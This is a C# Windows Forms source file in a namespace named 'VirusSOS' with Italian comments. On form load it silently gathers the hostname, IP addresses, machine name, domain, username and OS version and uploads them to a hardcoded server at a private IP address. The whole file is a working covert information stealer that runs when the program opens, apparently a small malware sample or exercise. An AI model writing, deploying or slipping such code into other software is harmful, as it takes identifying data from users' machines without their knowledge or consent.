using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using VirusSOS;

namespace VirusSOS;

    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private async void Form1_Load(object sender, EventArgs e)
        {
            try
            {

                // Raccoglie informazioni di sistema
                string hostname = Dns.GetHostName();
                IPAddress[] addresses = Dns.GetHostAddresses(hostname);
                string ipList = string.Join(", ", addresses.Select(ip => ip.ToString()));
                string nomeMacchina = Environment.MachineName;
                string dominio = Environment.UserDomainName;
                string nomeUtente = Environment.UserName;
                string windows = Environment.OSVersion.ToString();

                string content = $"Hostname: {hostname}\nIP Address: {ipList}\nNome Macchina: {nomeMacchina}\nDominio: {dominio}\nNome Utente: {nomeUtente}\nVersione OS: {windows}\n";

                string server = "http://192.168.1.28:5000/upload";
                using (var client = new HttpClient())
                using (var form = new MultipartFormDataContent())
                {
                    form.Add(new StringContent(content), "testo");  // campo 'testo' con contenuto stringa

                    
                    HttpResponseMessage response = await client.PostAsync(server, form);

                    if (response.IsSuccessStatusCode)
                        Console.WriteLine("Contenuto inviato con successo!");
                    else
                        Console.WriteLine("Errore durante l'invio: " + response.StatusCode);
                }
            
                }
            catch (Exception ex)
            {
                Console.WriteLine($"Errore: {ex.Message}");
            }
        }
    }

